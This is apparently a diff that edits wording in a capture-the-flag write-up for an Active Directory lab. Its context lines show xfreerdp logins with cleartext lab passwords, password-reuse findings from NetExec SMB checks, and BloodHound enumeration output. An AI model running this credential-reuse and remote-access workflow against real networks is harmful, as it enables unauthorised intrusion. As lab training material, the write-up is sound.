@@ -107,7 +107,7 @@ r.williams
 svc.helpdesk
 ```
 
-Connect via `RDP` to the Windows machine, then open `powershell.exe` and check privileges.
+Connect via `RDP` to the Windows machine, then open `PowerShell` and check privileges.
 
 ```bash
 root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /d:ctf.local /u:j.smith /p:'JSmith@IT2024' /dynamic-resolution
@@ -234,7 +234,7 @@ SMB         TARGET_IP    445    DC01             [-] ctf.local\svc.helpdesk:Help
 
 `r.williams` shares a password with `t.jones`, revealing a new attack vector. `t.jones` and `r.williams` have valid authentication credentials for `LDAP` and `SMB`; they also appear to have administrative access through `RDP`, as indicated by `NetExec`'s `(Pwn3d!)` flag. 
 
-Connect via `RDP` to the Windows machine, then open `powershell.exe` and check privileges for `t.jones`.
+Connect via `RDP` to the Windows machine, then open `PowerShell` and check privileges for `t.jones`.
 
 ```bash
 root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /d:ctf.local /u:t.jones /p:'Helpdesk01!' /dynamic-resolution
@@ -286,7 +286,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-Connect via `RDP` to the Windows machine, then open `powershell.exe` and check privileges for `r.williams`.
+Connect via `RDP` to the Windows machine, then open `PowerShell` and check privileges for `r.williams`.
 
 ```bash
 root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /d:ctf.local /u:r.williams /p:'Helpdesk01!' /dynamic-resolution
@@ -379,7 +379,7 @@ INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: DC01.ctf.local
 INFO: Done in 00M 02S
-INFO: Compressing output into 20261103170320_bloodhound.zip
+INFO: Compressing output into bloodhound.zip
 ```
 
 > [!WARNING]
